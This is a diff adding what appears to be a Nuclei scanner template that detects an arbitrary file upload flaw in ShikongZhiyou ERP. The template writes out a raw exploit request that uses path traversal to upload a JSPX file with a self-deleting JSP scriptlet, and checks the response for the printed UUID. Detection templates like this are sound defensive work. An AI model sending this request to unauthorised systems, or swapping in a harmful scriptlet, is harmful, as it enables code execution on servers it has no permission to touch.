@@ -1,0 +1,30 @@
+id: shikongzhiyou-erp-file-upload
+
+info:
+  name: ShikongZhiyou ERP File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    This template checks for a file upload vulnerability in the ShikongZhiyou ERP system via the `updater.uploadStudioFile` endpoint. Exploitation could allow arbitrary file uploads, posing significant security risks.
+  tags: shikongzhiyou, erp, file-upload, vulnerability
+
+http:
+  - raw:
+      - |
+        POST /formservice?service=updater.uploadStudioFile HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        content=<updater xmlns:jsp="http://java.sun.com/JSP/Page"><filename>test.jspx</filename><filepath>../../../images/</filepath><filesize>347</filesize><lmtime>{{unix_time()}}</lmtime><jsp:scriptlet>out.println(java.util.UUID.randomUUID().toString());new java.io.File(application.getRealPath(request.getServletPath())).delete();</jsp:scriptlet></updater>
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "UUID"
+      - type: regex
+        regex:
+          - "jsp:scriptlet.*UUID"
